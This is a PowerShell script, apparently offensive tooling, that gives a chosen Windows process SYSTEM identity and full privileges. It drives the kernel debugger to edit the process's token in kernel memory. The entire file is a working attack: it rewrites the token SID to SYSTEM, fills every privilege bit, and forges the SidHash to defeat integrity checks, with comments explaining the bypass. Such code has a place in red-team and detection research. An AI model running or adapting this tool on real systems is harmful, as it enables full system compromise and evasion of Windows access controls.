<#

.SYNOPSIS 
PowerProcess utility to elevate as system with full privileges
 
.DESCRIPTION 
This utility target a process and elevate it as SYSTEM with full privileges on the system
This utility must be run with elevated permissions. 
We need the /debug mode switch to on (bcdedit.exe /debug on)

.EXAMPLE 
PS > Inject-AllPrivilegesInProcess -Process cmd.exe

Windows 7, 8, 10 supported (64 bits)

#>


[CmdletBinding()]
param (
    [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=0)]        
        [string] $Process
)

#---------------------------------------------------------[Initialisations]--------------------------------------------------------

Set-StrictMode -version 2

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptParentPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$kd = "$scriptPath\x64\kd.exe"
$symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
$utilityFunctions = "$scriptPath\Get-Utilities.ps1"

#----------------------------------------------------------[Functions]-------------------------------------------------------------

. $utilityFunctions

#----------------------------------------------------------[Execution]-------------------------------------------------------------

$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
$osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

$mode = Get-OperatingSystemMode $operatingSystem $osArchitecture

<# 

typedef struct _SID_AND_ATTRIBUTES_HASH {
  DWORD               SidCount;
  PSID_AND_ATTRIBUTES SidAttr;
  SID_HASH_ENTRY      Hash[SID_HASH_SIZE];
} SID_AND_ATTRIBUTES_HASH, *PSID_AND_ATTRIBUTES_HASH;


find offset dt -b -v nt!_token SidHash. tokenAddress 
+0x0e0 SidHash  : struct _SID_AND_ATTRIBUTES_HASH, 3 elements, 0x110 bytes
      +0x000 SidCount : 5
      +0x008 SidAttr  : 0xfffff8a0`00004f58
      +0x010 Hash     : (32 elements) 

Each time the process is authorized, the system verifies the correctness of the table enumerating 
SidHash and comparing it with that stored in the SidHash.

SidHash _SID_AND_ATTRIBUTES_HASH structure consisting of three fields: 
* SidCount (the same as in the UserAndGroupCount structure TOKEN), 
* SidAttr (ie, the same as in UserAndGroups) 
* Hash containing the same shortcut

struct _SID_AND_ATTRIBUTES_HASH, 3 elements, 0x110 bytes

0x110 = 272 bytes, of which 16 for the first two fields, 
and the rest of the 32-element array Hash, each element 
in the array is an 8-byte

And now a few 'facts', I checked experimentally.

An SID of two different processes from the same user leads to the same SidHash;
A slight difference in the SID leads to a small difference in SidHash;
A change in group leads to a slight change in SidHash;
The same set of array SID processes with two different machines, irrespective of the domain leads to the same SidHash.

Knowing these few facts we could:

1. copy the number of elements from SidCount;
2. copy the contents (not the address!) of the SID 
3. copy the contents of the SidHash 
#>

Switch ($mode) {
    "1" { 
            $offset = "208"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = "0x188"
        }
    "132" { 
            $offset = "f8"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = ""
        }
    "2" { 
            $offset = "348"
            $sidHashOffset = "+0x0e8+0x010"
            $activeProcessLinksOffset = "0x2e8"
        }
    "8.1" {# to do
        }
    "2r2" {# to do
        }
    "232" {# to do
        }
    "2016" { 
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
        }
}

Write-Output "Trying to give full privileges to the process $Process"

$chain = "!process 0 0 $Process"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"PROCESS") + 1
$processAddress = $tabFA[$fi]
Write-Output "$Process memory address found!"

$chain =  "dq $processAddress+$offset L1"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')                
$fi = [array]::indexof($tabFA,"L1") + 3
$processTokenAddress = $tabFA[$fi] -replace "``", ""
Write-Output "$Process token address found!"

$chain = "? $processTokenAddress & fffffffffffffff0"
Write-InFile $buffer "$chain"
$tabAnd = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabAnd -split ' ') 
$fi = [array]::indexof($tabFA,"fffffffffffffff0") + 5
$processTokenAddressAnded = $tabFA[$fi] -replace "``", ""

$chain =  "dt -v -b nt!_TOKEN UserAndGroups $processTokenAddressAnded"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$fi = [array]::indexof($tabFA,"lkd>") + 25
$structTOKENAddress = $tabFA[$fi]
$fi = [array]::indexof($tabFA,"lkd>") + 15
$elementsNumber = $tabFA[$fi]
Write-Output "$elementsNumber elements"

$chain =  "dt -v -b nt!_SID_AND_ATTRIBUTES $structTOKENAddress"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$fi = [array]::indexof($tabFA,"lkd>") + 37
$structSIDANDATTRIBUTESAddress = $tabFA[$fi]
$fi = [array]::indexof($tabFA,"lkd>") + 14
$elementsNumber = $tabFA[$fi]
Write-Output "struct _SID_AND_ATTRIBUTES memory address: $structSIDANDATTRIBUTESAddress - $elementsNumber elements"

$chain = "!sid $structSIDANDATTRIBUTESAddress"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$fi = [array]::indexof($tabFA,"lkd>") + 11
$sidValue = $tabFA[$fi]
Write-Output "SID is: $sidValue"

Write-Output "Modifying SID..."
$chain ="r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthorityCount=1)"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$chain ="r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthority[0]=18)"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols

$chain = "!sid $structSIDANDATTRIBUTESAddress"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')    
$tabFA
$fi = [array]::indexof($tabFA,"lkd>") + 11
$sidValue = $tabFA[$fi]
Write-Output "SID is: $sidValue"

Write-Output "Modifying Privileges..."
$tokenPrivilegesOffset = "$processTokenAddressAnded+0x40"
$chain = "f $tokenPrivilegesOffset L18 0xff"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

# dt -b -v nt!_token SidHash. tokenAddress
# dd tokenAddress+0x0e0+0x010 L40
Write-Output "Modifying SIDHash..."
$hashSystem = "0x16 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x08 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x1c 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00"
$tokenSidHashOffset = "$processTokenAddressAnded$sidHashOffset"
$chain = ".formats $tokenSidHashOffset"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')            
$fi = [array]::indexof($tabFA,"Hex:") + 5
$formatTokenSidHashOffset = $tabFA[$fi]

$chain = "f $formatTokenSidHashOffset L100 $hashSystem"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

$chain = "dt nt!_eprocess ActiveProcessLinks. ImageFileName $processAddress"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"[") + 1
$processAddress = $tabFA[$fi]
Write-Output "$Process memory address found!"

Write-Output "$Process is System and has FULL privileges"